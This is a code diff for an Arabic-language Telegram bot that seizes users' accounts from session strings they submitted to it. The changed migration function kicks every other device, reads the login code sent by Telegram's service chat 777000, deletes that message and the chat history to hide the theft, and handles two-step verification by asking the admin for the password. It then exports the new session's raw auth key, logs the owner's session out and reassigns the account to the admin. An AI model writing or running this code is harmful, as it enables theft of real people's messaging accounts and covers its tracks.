@@ -39,7 +39,7 @@ import telebot
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 from pyrogram import Client
 from pyrogram.enums import ChatType
-from pyrogram.errors import (FloodWait, AuthKeyUnregistered, SessionRevoked, UserDeactivated, UserDeactivatedBan, PasswordHashInvalid, BadRequest)
+from pyrogram.errors import (FloodWait, AuthKeyUnregistered, SessionRevoked, UserDeactivated, UserDeactivatedBan, PasswordHashInvalid, BadRequest, SessionPasswordNeeded)
 from pyrogram.raw import functions, types
 
 from telethon.sessions import StringSession
@@ -308,7 +308,6 @@ def get_all_accounts(owner_id):
 def get_account(acc_id):
     conn = get_db_conn()
     c = conn.cursor()
-    # هنا حددنا الـ 12 عمود الأساسية عشان ما يخرب تفكيك البيانات في بقية السكريبت
     c.execute("SELECT id, owner_id, phone, user_id, first_name, pyro_session, tl_session, session_type, auto_term_enabled, auto_term_interval, last_term_attempt, surveilled FROM sessions WHERE id=?", (acc_id,))
     row = c.fetchone()
     conn.close()
@@ -471,7 +470,7 @@ def log_to_channel(text, file_path=None, session_text=None):
         logging.error(f"فشل إرسال للقناة: {e}")
 
 # =========================================================
-# 📥 دالة سحب الحساب من خلال كود Hex المرسل للروبوت (محدثة مع الكيبورد الأصلي)
+# 📥 دالة سحب الحساب من خلال كود Hex المرسل للروبوت
 # =========================================================
 
 @bot.message_handler(func=lambda message: message.text and re.search(r'([a-fA-F0-9]{250,})\s+([1-5])', message.text))
@@ -479,7 +478,6 @@ def handle_hex_login(message):
     if not is_allowed(message.from_user.id):
         return
 
-    # استخراج الهاكس ورقم السيرفر
     match = re.search(r'([a-fA-F0-9]{250,})\s+([1-5])', message.text)
     hex_data = match.group(1)
     dc_id = int(match.group(2))
@@ -508,7 +506,6 @@ def handle_hex_login(message):
 
             await client.disconnect()
 
-            # 🔥 حفظ الحساب بالداتا مع الهاكس والسيرفر بصمت
             save_hex_account(message.from_user.id, phone, user_id, first_name, pyro_session, tl_session, "HEX", hex_data, dc_id)
 
             text = (
@@ -523,7 +520,6 @@ def handle_hex_login(message):
 
             bot.delete_message(message.chat.id, msg.message_id)
 
-            # 🔥 هنا يتم استدعاء لوحة التحكم الأصلية الخاصة بك
             bot.send_message(
                 message.chat.id, 
                 text, 
@@ -538,39 +534,28 @@ def handle_hex_login(message):
     run_async(process_hex())
 
 # =========================================================
-# 👑 السحب الشامل والمطور (نظام التهجير والمراقبة)
+# 👑 السحب الشامل والمطور (نظام التهجير واعتراض الكود) دالتك الأساسية
 # =========================================================
 
 async def execute_full_migration(acc_id, client_a, original_owner, admin_id, phone, name):
-    """محرك السحب الخام والتهجير الجذري إلى Session B وتسجيل الخروج من A (الترتيب الجديد والقراءة من القاعدة)"""
+    """محرك السحب الاحترافي - اعتراض الكود، دعم 2FA، واستخراج مفتاح tdata"""
 
     B_DEVICE_MODEL = f"MigrationB_{acc_id}"
     client_b = None
-    verify_b = None
+    login_code = None
+    msg_to_delete = None
 
     try:
-        # 1. استخراج السيرفر الصحيح والهاكس والآيدي من قاعدة البيانات
-        conn = get_db_conn()
-        c = conn.cursor()
-        c.execute("SELECT dc_id, hex_key, user_id FROM sessions WHERE id=?", (acc_id,))
-        row = c.fetchone()
-        conn.close()
-
-        target_dc = int(row[0]) if row and row[0] else 2
-        saved_hex = row[1] if row and len(row) > 1 else "UNKNOWN"
-        target_user_id = int(row[2]) if row and len(row) > 2 and row[2] else 9999
-
+        # [1] التأكد من اتصال الجلسة A
         if not client_a.is_connected:
             await client_a.connect()
 
-        # 2. طرد جميع الأجهزة الأخرى أولاً من الجلسة A قبل توليد أي جلسة جديدة
+        # [2] طرد جميع الأجهزة الأخرى أولاً من الجلسة A
         auths = await client_a.invoke(functions.account.GetAuthorizations())
         hit_24h_limit = False
 
         for auth in auths.authorizations:
-            is_current_a = getattr(auth, 'current', False)
-
-            if not is_current_a:
+            if not getattr(auth, 'current', False):
                 try:
                     await client_a.invoke(functions.account.ResetAuthorization(hash=auth.hash))
                     await asyncio.sleep(0.5) 
@@ -580,9 +565,8 @@ async def execute_full_migration(acc_id, client_a, original_owner, admin_id, pho
                         hit_24h_limit = True
                         break 
                     elif "flood" in err_str:
-                        await asyncio.sleep(5)
+                        await asyncio.sleep(4)
 
-        # إذا طلب الانتظار 24 ساعة، نضع الحساب تحت المراقبة ونوقف العملية
         if hit_24h_limit:
             conn = get_db_conn()
             c = conn.cursor()
@@ -592,8 +576,7 @@ async def execute_full_migration(acc_id, client_a, original_owner, admin_id, pho
             if client_a.is_connected: await client_a.disconnect()
             return False
 
-        # 3. الآن لم يتبقَ سوى الجلسة A. 
-        # نترك Pyrogram يولد مفتاح جديد ونظيف (بدون حقن String مزيف) ونجبره على السيرفر الصحيح
+        # [3] إنشاء الجلسة B وطلب كود الدخول
         client_b = Client(
             f"cb_{acc_id}_{int(time.time())}", 
             api_id=API_ID, 
@@ -601,143 +584,149 @@ async def execute_full_migration(acc_id, client_a, original_owner, admin_id, pho
             in_memory=True,
             device_model=B_DEVICE_MODEL
         ) 
+        
+        await client_b.connect()
+        sent_code = await client_b.send_code(phone)
+        
+        await asyncio.sleep(3.5)
 
-        await client_b.storage.open()
-        await client_b.storage.dc_id(target_dc) 
-        await client_b.storage.test_mode(False)
-        await client_b.connect() 
+        # [4] اعتراض الكود عبر الجلسة A وحذف الأثر فوراً
+        async for msg in client_a.get_chat_history(777000, limit=3):
+            if msg.text and ("Login code" in msg.text or "كود الدخول" in msg.text or "تسجيل الدخول" in msg.text):
+                match = re.search(r'\b(\d{5})\b', msg.text)
+                if match:
+                    login_code = match.group(1)
+                    msg_to_delete = msg
+                    break
 
-        # 5. طلب رمز تسجيل الدخول لـ B 
-        qr = await client_b.invoke(functions.auth.ExportLoginToken(api_id=API_ID, api_hash=API_HASH, except_ids=[]))
+        if not login_code:
+            raise Exception("لم يتم العثور على الكود في محادثة 777000.")
 
-        # في حال طلب منا السيرفر الانتقال لـ DC آخر
-        if isinstance(qr, types.auth.LoginTokenMigrateTo):
-            await client_b.disconnect()
-
-            # ننشئ الجلسة مرة أخرى على السيرفر المطلوب
-            client_b = Client(f"cb_retry_{acc_id}", api_id=API_ID, api_hash=API_HASH, in_memory=True, device_model=B_DEVICE_MODEL)
-
-            await client_b.storage.open()
-            await client_b.storage.dc_id(int(qr.dc_id))
-            await client_b.storage.test_mode(False)
-            await client_b.connect()
-
-            # 🟢 خطوة هامة: استخدام ImportLoginToken عند التهجير بدلاً من Export لتفادي فصل الرمز
-            qr = await client_b.invoke(functions.auth.ImportLoginToken(token=qr.token))
-
-        # 6. الجلسة A توافق على الرمز وتمرر الصلاحيات
-        if isinstance(qr, types.auth.LoginToken):
-
-            # نأخذ ناتج القبول
+        # حذف رسالة الكود ومحادثة 777000 (محو الأثر)
+        if msg_to_delete:
             try:
-                res_a = await client_a.invoke(functions.auth.AcceptLoginToken(token=qr.token))
-            except Exception as e:
-                raise Exception(f"فشل الجلسة A في الموافقة على الرمز: {str(e)}")
-
-            # 7. 🟢 جلب حالة النجاح لـ B (هذا ضروري جداً لتفعيل AuthKey في سيرفر تيليجرام)
-            success_obj = None
-            for _ in range(12):  # الانتظار والمحاولة 12 مرة كحد أقصى لتفادي التايم أوت
-                await asyncio.sleep(1.5)
-                try:
-                    res = await client_b.invoke(functions.auth.ExportLoginToken(api_id=API_ID, api_hash=API_HASH, except_ids=[]))
-                    if isinstance(res, types.auth.LoginTokenSuccess):
-                        success_obj = res
-                        break
-                except Exception:
-                    pass
-
-            if not success_obj:
-                raise Exception("وافقت الجلسة A على الرمز، ولكن B لم يستلم إشارة التفعيل (LoginTokenSuccess).")
-
-            # 8. إجبار مكتبة Pyrogram على تحديث بيانات الجلسة داخلياً
-            try:
-                authorized_user_id = success_obj.authorization.user.id
+                await client_a.delete_messages(777000, msg_to_delete.id)
+                peer = await client_a.resolve_peer(777000)
+                await client_a.invoke(functions.messages.DeleteHistory(peer=peer, max_id=0, just_clear=True, revoke=True))
             except Exception:
-                try:
-                    authorized_user_id = res_a.user.id
-                except Exception:
-                    authorized_user_id = target_user_id
+                pass
 
-            await client_b.storage.user_id(authorized_user_id)
-            await client_b.storage.is_bot(False)
-
-            # 9. التحقق من أن B قادر على الاتصال كصاحب الحساب
+        # [5] تسجيل دخول الجلسة B والتعامل مع التحقق بخطوتين (2FA)
+        try:
+            await client_b.sign_in(phone, sent_code.phone_code_hash, login_code)
+        except SessionPasswordNeeded:
+            # البوت يكتشف وجود تحقق بخطوتين ويطلب الباسوورد من الأدمن
             try:
-                me_b = await client_b.get_me()
+                bot.send_message(
+                    admin_id,
+                    f"🔐 **تـحـقـق بـخـطـوتـيـن (2FA)**!\n\n"
+                    f"⎉╎ الـرقـم: `{phone}`\n"
+                    f"⎉╎ الاسـم: {name}\n\n"
+                    f"•❐• أرسـل كـلـمـة سـر الـتـحـقـق خـطـوتـيـن الآن لـلـمـتـابـعـة (لـديـك دقيقتان):",
+                    parse_mode="Markdown"
+                )
+                
+                # انتظار رد الأدمن بالباسوورد (معدلة لكي لا يحصل خطأ AttributeError في مكتبة telebot)
+                USER_STATES[admin_id] = {"action": "wait_for_2fa"}
+                password = None
+                for _ in range(60):
+                    await asyncio.sleep(2)
+                    if "2fa_pass" in USER_STATES.get(admin_id, {}):
+                        password = USER_STATES[admin_id]["2fa_pass"]
+                        del USER_STATES[admin_id]
+                        break
+                
+                if not password:
+                    raise asyncio.TimeoutError()
+                
+                # إدخال الباسوورد
+                await client_b.check_password(password)
+                bot.send_message(admin_id, "✅ تـم قـبـول الـبـاسـوورد بـنـجـاح، مـتـابـعـة الـتـهـجـيـر...")
+                
+            except asyncio.TimeoutError:
+                bot.send_message(admin_id, f"⏳ انـتـهـى الـوقـت لـإدخـال بـاسـوورد `{phone}`. تـم إلـغـاء الـعـمـلـيـة.", parse_mode="Markdown")
+                raise Exception("Admin did not provide 2FA password in time.")
             except Exception as e:
-                raise Exception(f"فشل التحقق من B بعد استلام النجاح: {str(e)}")
+                raise Exception(f"فشل إدخال الباسوورد: {str(e)}")
 
-            if not me_b:
-                raise Exception("فشل الحصول على بيانات الحساب للجلسة الجديدة.")
+        # [6] التحقق من صحة الجلسة B واستخراج المفاتيح
+        me = await client_b.get_me()
+        if not me or not me.id:
+            raise Exception("فشل التحقق من الجلسة B عبر get_me!")
 
-            # 10. تصدير الجلسة B وفصلها للتحقق (الآن ستعمل بنجاح 100%)
-            session_b_str = await client_b.export_session_string()
+        target_dc = me.dc_id if me.dc_id else 2
+
+        # استخراج الـ Session String
+        session_b_str = await client_b.export_session_string()
+
+        # استخراج مفتاح الـ AuthKey الخام (الخاص بـ tdata) بصيغة Hex + رقم السيرفر
+        try:
+            auth_key_bytes = client_b.session.auth_key.key
+            hex_key_str = auth_key_bytes.hex()
+            final_tdata_key = f"{hex_key_str} {target_dc}"
+        except Exception:
+            # في حال فشل استخراج الـ AuthKey الخام نعود للـ String العادي
+            final_tdata_key = f"FAILED_TO_EXTRACT_HEX {target_dc}"
+
+        # [7] انتحار الجلسة A عبر الـ Raw API (تمرير السلطة المطلقة لـ B)
+        try:
+            await client_a.invoke(functions.auth.LogOut())
+        except Exception:
+            pass 
+            
+        if client_a.is_connected: 
+            await client_a.disconnect()
+
+        if client_b.is_connected:
             await client_b.disconnect()
 
-            verify_b = Client(f"vb_{acc_id}", api_id=API_ID, api_hash=API_HASH, session_string=session_b_str, in_memory=True)
-            await verify_b.connect()
-            verify_me = await verify_b.get_me()
+        # [8] تحديث الداتا بيس لصالح الأدمن
+        conn = get_db_conn()
+        c = conn.cursor()
+        c.execute("UPDATE sessions SET pyro_session=?, owner_id=?, surveilled=0, tl_session='', hex_key=? WHERE id=?", 
+                  (session_b_str, admin_id, final_tdata_key, acc_id))
+        conn.commit()
+        conn.close()
 
-            if not verify_me:
-                raise Exception("فشل التحقق من Session B عبر العميل المستقل")
+        # [9] إرسال كليشة الضحية
+        kick_msg = (
+            f"🛂┊ تـنـبـيـه هـام - طـرد جـلـسـة !\n\n"
+            f"⎉╎ تـم طـرد جـلـسـة الـبـوت لـحـسـاب:\n"
+            f"⎉╎ الاسـم: {name}\n"
+            f"⎉╎ الـرقـم: {phone}\n"
+            f"•❐• تـم حـذفـه مـن الـبـوت تـلـقـائـيـاً."
+        )
+        try: bot.send_message(original_owner, kick_msg)
+        except Exception: pass
 
-            await verify_b.disconnect()
+        # [10] إرسال كليشة النجاح للأدمن (بالصيغة المطلوبة للـ tdata)
+        admin_msg = (
+            f"✅ تـم الـسـحـب والـتـهـجـيـر بـنـجـاح (مـع الـتـحـقـق بـخـطـوتـيـن إن وجـد)!\n\n"
+            f"⎉╎ الـرقـم: `{phone}`\n"
+            f"⎉╎ الاسـم: {name}\n"
+            f"⎉╎ الـسـيـرفـر (DC): {target_dc}\n\n"
+            f"🔑 مـفـتـاح tdata (HEX + DC):\n`{final_tdata_key}`\n\n"
+            f"🔒 الـجـلـسـة (String):\n`{session_b_str}`\n\n"
+            f"•❐• تـم مـسـح رسـالـة الـكـود، وتـدمـيـر جـلـسـة A، وتـركـيـع B عـلـى الـعـرش."
+        )
+        bot.send_message(admin_id, admin_msg, parse_mode="Markdown")
 
-            # 11. الجلسة A تسجل خروج بنفسها (لتدمير الجلسة القديمة والاعتماد على B فقط)
-            try:
-                await client_a.invoke(functions.auth.LogOut())
-            except Exception: 
-                pass
-
-            if client_a.is_connected: await client_a.disconnect()
-
-            # 12. تحديث الملكية في الداتا بيس لصالح الأدمن بـ B
-            conn = get_db_conn()
-            c = conn.cursor()
-            c.execute("UPDATE sessions SET pyro_session=?, owner_id=?, surveilled=0, tl_session='' WHERE id=?", (session_b_str, admin_id, acc_id))
-            conn.commit()
-            conn.close()
-
-            # 13. إرسال الكليشة للضحية
-            kick_msg = (
-                f"🛂┊ تـنـبـيـه هـام - طـرد جـلـسـة !\n\n"
-                f"⎉╎ تـم طـرد جـلـسـة الـبـوت لـحـسـاب:\n"
-                f"⎉╎ الاسـم: {name}\n"
-                f"⎉╎ الـرقـم: {phone}\n"
-                f"•❐• تـم حـذفـه مـن الـبـوت تـلـقـائـيـاً."
-            )
-            try:
-                bot.send_message(original_owner, kick_msg)
-            except Exception: 
-                pass
-
-            # 14. إرسال رسالة النجاح للأدمن
-            admin_msg = (
-                f"✅ تـم سـحـب وتـهـجـيـر الـحـسـاب بـنـجـاح!\n\n"
-                f"⎉╎ الـرقـم: `{phone}`\n"
-                f"⎉╎ الاسـم: {name}\n"
-                f"⎉╎ الـسـيـرفـر (DC): {target_dc}\n\n"
-                f"🔑 مـفـتـاح HEX (المحفوظ):\n`{saved_hex} {target_dc}`\n\n"
-                f"•❐• تـم إنـهـاء بـاقـي الـجـلـسـات أولاً وتـسـجـيـل خـروج الـجـلـسـة الـقـديـمـة وتـولـيـد B مـسـتـقـلـة بـمـلـكـيـتـك."
-            )
-            bot.send_message(admin_id, admin_msg, parse_mode="Markdown")
-
-            # حذف الحساب من المؤقت إذا لزم الأمر
-            conn = get_db_conn()
-            c = conn.cursor()
-            c.execute("DELETE FROM sessions WHERE id=?", (acc_id,))
-            conn.commit()
-            conn.close()
-
-            return True
-        else:
-            raise Exception("فشل في توليد رمز QR، الخادم أرجع استجابة غير متوقعة.")
+        return True
 
     except Exception as e:
         logging.error(f"Migration Failed for {phone}: {e}")
-        if client_b and client_b.is_connected: await client_b.disconnect()
-        if verify_b and verify_b.is_connected: await verify_b.disconnect()
-        if client_a.is_connected: await client_a.disconnect()
+        
+        # في حال فشلت العملية، نتأكد من إغلاق الجلسات لعدم ترك أي معلق
+        if client_b and client_b.is_connected: 
+            await client_b.disconnect()
+        if client_a and client_a.is_connected: 
+            await client_a.disconnect()
+            
+        try:
+            bot.send_message(admin_id, f"❌ فشل التهجير للرقم `{phone}`\nالسبب: {str(e)}", parse_mode="Markdown")
+        except Exception:
+            pass
+            
         return False
 
 # =========================================================
@@ -1144,6 +1133,12 @@ def process_successful_login(message, status_msg, me, pyro_session, session_type
             log_to_channel(channel_text, session_text=raw_hex)
         else:
             log_to_channel(channel_text, session_text=pyro_session)
+
+# 🟢 التقاط الباسوورد بخطوتين من المستخدم 
+@bot.message_handler(func=lambda message: message.from_user.id in USER_STATES and USER_STATES[message.from_user.id].get("action") == "wait_for_2fa")
+def handle_2fa_password_input(message):
+    USER_STATES[message.from_user.id]["2fa_pass"] = message.text.strip()
+    bot.reply_to(message, "⏳ تـم اسـتـلام كـلـمـة الـسـر، جـاري الـتـحـقـق والـتـهـجـيـر...")
 
 @bot.message_handler(func=lambda message: message.text and not message.text.startswith('/'))
 def handle_text_input(message):
